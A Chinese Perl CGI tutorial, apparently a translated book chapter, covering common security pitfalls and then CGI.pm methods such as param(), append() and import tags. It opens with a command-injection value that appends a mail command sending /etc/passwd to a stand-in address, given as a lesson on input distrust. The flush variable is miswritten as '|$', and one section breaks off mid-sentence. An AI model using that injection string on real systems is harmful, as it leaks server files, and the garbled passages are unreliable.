
`sillyname@sillyplace.com ; /bin/mail badboy@naughty.no < /etc/passwd`

你可能会遇到一点问题。也就是说，`badboy@naughty.no` 得到了你的密码文件的副本。哎。

这里的教训显而易见：不要信任任何来自用户的输入。记住，CGI 程序是运行在你服务器上的程序。如果这些程序可以被骗执行超出你预料的任务，可能会遇到严重的安全问题。幸运的是，Perl 有非常有用的 `-T` 选项，它会告诉你此处的漏洞并拒绝运行。不要在没有指定 `-T` 选项的情况下运行 CGI 程序。这样做的方法是：

```
#!/usr/bin/perl -T
```

如果你在服务器上运行了任何类型的“安全”服务，例如通过 SSL 提供的表单（这些表单用于从客户或合作伙伴处获取信用卡或其他敏感数据），那么你特别需要考虑这种情况。机器上拥有的吸引坏人关注的数据越多，他们就会花费更多的资源来尝试获取你试图隐藏的内容。

另一个重要的考虑因素是，你并真的不知道连接另一端在和谁通信。对方可能根本不是浏览器，而是某个使用 `telnet` 连接到你的 HTTP 端口的人，试图以你未想到的方式与你的守护进程（`daemon`）或程序交互。你有理由对这个问题保持怀疑。

## Perl CGI 程序的常见陷阱

Perl 是一种非常强大的语言。然而，在编写 CGI 程序时你确实需要小心避免常见的陷阱。其中一些陷阱与功能有关，而另一些与安全有关。记住所有这些点，并确保你的程序既功能完备又安全。现在来看看我最喜欢的一些陷阱：

### 将不安全的数据传递给 shell

- 到目前为止，这个问题对于新手（以及粗心的）Perl 程序员来说是最糟糕的。列表 `19.6` 引用了一个例子。列表 `19.5` 也有这种潜在风险，因为我们使用了 shell（在打开 `PERLDOC` 文件句柄时），但我们对 `$ENV{'QUERY_STRING'}` 的处理将其转换为 `$query` 解决了这个问题。如果可能，几乎始终在 CGI 程序中避免使用 shell 是最好的做法。

### 对环境做出假设

- 许多人编写程序时，假设系统中的其他程序和文件位于它们在自己系统中所在的位置。在实践中，对于另一个供应商的操作系统，程序和配置文件可能位于另一个地方，甚至根本不存在。做出此类假设会阻碍 Perl 极强的可移植性，当你从一个环境移动到另一个环境时，必须重写程序。我喜欢将对外部资源（如 shell 或底层 UNIX 命令）的依赖降到最低，除非由于某些原因无法避免否则完全不使用，而这是一个相当罕见的事件。（不过，在列表 `19.5` 中，你会注意到我们确实这样做。在这种情况下，为了避免使用 shell，程序会变得复杂，因此直接使用 shell 并由自己对用户输入进行清洗反而更有意义。）

### 文件权限问题

- 记住，程序将在你系统中 HTTP 守护进程的 UID 下运行。你需要确保 HTTP 守护进程对该程序具有读取权限，程序开启了执行位，并且任何将要读取、写入、创建或删除的文件都可以在 HTTP 守护进程的 UID 下完成你所需的任何操作。

### 未进行充分的错误检查

- 帮帮自己吧，检查错误情况。当你的程序在 `open()`、`fork()` 或任何其他地方遇到意外错误时，不要让它静地停止工作，而是使用 `die()` 让它大声抱怨该问题。注意列表 `19.5` 如何在 `open()` 中使用 `die()`。如果 `perldoc` 不在 `/usr/local/bin/` 中，或者发生了其他错误，使用该 `die()` 可以节省你大量寻找和消除问题的时间。

### 没有利用有用的 Perl 选项

- 这是一个浪费大量时间寻找愚蠢错误的趣味方法。我们已经提到过 `-T`，但让我再次强调：永远不要在没有它的情况下运行 CGI Perl 程序。另一个有用的开关是 `-w`。它将为你提供代码中潜在问题的警告。永远不要在没有指定 `-w` 的情况下测试代码。如果你在指定 `-w` 时收到警告，你最好去解决它们，而不是通过移除 `-w` 来让它们“消失”。相反，如果你收到了警告，并且知道它的含义、产生的原因，且确定它不会给你带来问题，那么在将程序移到生产环境时，移除 `-w` 可能是可以。

### 没有利用有用的 Perl 模块

- 提供数据接口、解析能力等大部分工作已经存在了。与其自己实现它们，不如使用已有的工具效率会高得多。如果你正在编写任何超过几行的 CGI，绝对应该使用那几个非常酷的 CGI Perl 模块。事实上，如果你没有 `CGI.pm`，现在就去获取。我可以等。好了吗？很好，在下一节中你会需要它的。

### 忘记刷新 `STDOUT`

- 优秀的 CGI 程序员会要求程序在每次写入后刷新 `STDOUT` 输出缓冲区。这样，在程序崩溃之前，MIME 类型就能传出去（浏览器就能看到它）。这是通过将 `|$` 设置为非零值实现的）。注意列表 `19.2`。注释掉我设置 `|$` 值的那行代码并再次运行程序。看到区别了吗？当输出被缓冲时，`uptime(1)` 的结果会在之前

## `keywords()`

你可以使用 `keywords()` 方法从 `<ISINDEX>` 查询中获取关键字列表。例如：

```
@keywords = $cgi->keywords
```

## `param()`

你使用此方法来获取和设置参数的名称和值。如果你需要知道所有传递给程序的参数（即它们的名称），可以如下所示使用 `param()` 方法：

```
@params = $cgi->param
```

要获取给定参数的值，只需将你想要获取其值的参数名称传递给 `param()` 方法即可。如果如果给定参数有多个值，该方法将返回一个数组；否则，它将返回一个标量。

```
$value = $cgi->param('foo'); # 用于标量
@values = $cgi->param('foo'); # 用于数组
```

设置值同样简单。将数组传递给参数将使你拥有一个多值参数。这种功能对于许多用途非常有用：初始化填写表单的元素、在字段已设置后更改其值等。

```
$cgi->param( -name => 'foo',
 -values => \['first', 'second', 'third',
'etc.'\]);
```

## `append()`

如果你需要向参数添加信息，可以如下所示使用 `append()` 方法：

```
$cgi->append( -name => 'foo',
 -values => \['some', 'more', 'stuff'\]);
```

## `delete()`

该方法顾如其名，删除一个参数。

```
$cgi->delete('foo');
```

## `delete_all()`

该方法删除所有参数，留下一个空的 CGI 对象。

```
$cgi->delete_all();
```

## 将 CGI.pm 导入当前命名空间

`use CGI` 会将方法名导入到当前命名空间。如果你只想导入特定的方法，可以如下所示操作：

```
use CGI qw(header start_html end_html);
```

你可能希望将一组方法导入到当前命名空间，而不是一个一个地单独导入。只需按这种方式指定你想要的方法族即可：

```
use CGI qw(:cgi :form :html2);
```

但请注意，这会让源代码对其他人来说变得更难追踪。此外，这不被认为是良好的面向对象（OO）实践。通过将方法直接导入到你的当前命名空间，维护和扩展程序将变得困难得多。如果你发现自己需要使用多个 CGI 对象（例如），那么追踪你正在引用哪个对象将变得非常混乱。请自为重。

以下是供你使用的方法族：

- `:cgi`: 这些标签支持 CGI 协议，包括 `param()`、`path_info()`、`cookie()`、`request_method()`、`header()` 等。
- `:form`: 所有的表单生成方法都在这里。
- `:html2`: html2 快捷方式（如 `br()`、`p()` 等）在这里，同样还有与 html2 接近的方法，如 `start_html()` 和 `end_html()`。
- `:html3`: html3.2 标签（如 html3 表格）在这里。
- `:netscape`: 并非属于 html3 的 Netscape 特性在这里。一些示例包括 `frameset()`、`blink()` 和 `center()`。
- `:html`: 该族是 html2、html3 和 Netscape 的并集。
- `:standard`: 该族是 html2、form 和 cgi 的并集。
- `:all`: 该族是所有内容的并集。

如果你想使用某人实现的标签，你可以使用 `:any` 方法族并在本地命名空间中继续使用它，如下例所示。使用该族会导致任何未识别的方法被解释为新的 HTML 标签。请注意，拼写错误会被解释为新标签。

```
use CGI qw(:any :all);
$q=new CGI;
print $q->newtag({ parameter=>'value',
 otherParameter=>'anotherValue'});
```
